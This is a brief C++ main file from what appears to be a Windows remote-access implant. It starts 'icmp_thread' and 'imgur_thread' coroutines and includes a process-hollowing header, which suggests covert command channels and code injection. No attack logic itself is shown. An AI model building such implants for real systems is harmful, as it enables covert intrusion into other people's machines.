//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include "../shared/coroutine.h"
#include "../config.h"
#include "../shared/debug.h"
#include "../shared/win32.h"
#include "../shared/process_hollowing.h"
#include "context.h"


void icmp_thread(context& ctx);
void imgur_thread(context& ctx);

int main()
{
    WSADATA wsa{};
    WSAStartup(0x0202, &wsa);

    context ctx{};
    coroutine_loop loop{};
    coroutine_loop::activate(loop);

    coro_start([&ctx]() { icmp_thread(ctx); });
    coro_start([&ctx]() { imgur_thread(ctx); });

    coro_run();

    WSACleanup();
}
